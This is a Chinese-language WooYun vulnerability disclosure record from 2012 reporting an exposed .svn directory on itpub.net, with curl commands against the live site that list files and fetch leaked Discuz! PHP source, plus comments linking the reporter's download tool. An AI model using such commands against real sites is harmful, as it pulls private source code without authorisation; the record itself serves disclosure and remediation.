{"id": 20430, "wybug_id": "wooyun-2012-05468", "wybug_title": "itpub技术论坛源码下载", "wybug_corp": "IT168.com", "wybug_author": "小雨", "wybug_date": "2012-03-22 18:34", "wybug_open_date": "2012-05-06 18:35", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-03-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-05-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 服务器设置不当，导致该网站源码可以被下载 详细说明：  网站使用svn管理版本，却未对.svn目录未加访问权限限制，   漏洞证明：  xxx@xxx /www/itpub.net $ curl http://www.itpub.net/.svn/entries可以得到web根目录文件目录列表，根据那个列表，可以请求svn working copy的text-base写一个简单的脚本就能遍历下载该站svn仓库中的全部源码。可以从源码进一步分析出更多安全漏洞xxx@xxx /www/itpub.net $ curl http://www.itpub.net/.svn/text-base/member.php.svn-base<?php/** *      [Discuz!] (C)2001-2099 Comsenz Inc. *      This is NOT a freeware, use is subject to license terms * *      $Id: member.php 20112 2011-02-15 07:10:53Z monkey $ */define('APPTYPEID', 0);define('CURSCRIPT', 'member');require './source/class/class_core.php';$discuz = & discuz_core::instance();$modarray = array('activate', 'clearcookies', 'emailverify', 'getpasswd',\t'groupexpiry', 'logging', 'lostpasswd',\t'register', 'regverify', 'switchstatus', 'connect');$mod = !in_array($discuz->var['mod'], $modarray) ? 'register' : $discuz->var['mod'];define('CURMODULE', $mod);$discuz->init();if($mod == 'register' && $discuz->var['mod'] != $_G['setting']['regname'] && !defined('IN_CONNECT')) {\tshowmessage('undefined_action');}require libfile('function/member');require libfile('class/member');runhooks();require DISCUZ_ROOT.'./source/module/member/member_'.$mod.'.php';?>   修复方案：  .svn目录加访问权限限制，你懂得。   版权声明：转载请注明来源 小雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：暂时无回应 漏洞Rank：0  确认时间：2012-03-22 18:34 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-03-22 18:44 |    \t\t小雨 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:19        | phper)\t\t \n  @xsser 老大，能帮忙把它厂商改成it168吗？他们是一家的。    \n     2012-03-22 20:06 |    \t\t小雨 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:19        | phper)\t\t \n  我写的那个小工具脚本等本问题确认修复之后会分享给大家    \n     2012-03-23 00:22 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @小雨 多谢分享！    \n     2012-03-25 11:07 |    \t\t小雨 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:19        | phper)\t\t \n  貌似他们一直都没反应，而且我看以前也有过报告.svn漏洞的例子了。这个工具就不藏着了。我的工具源码在: http://rains.im/?q=node/18    \n  \n\n\n", "wybug_level_fromcorp": "暂时无回应", "wybug_rank_fromcorp": 0, "Ranks": null}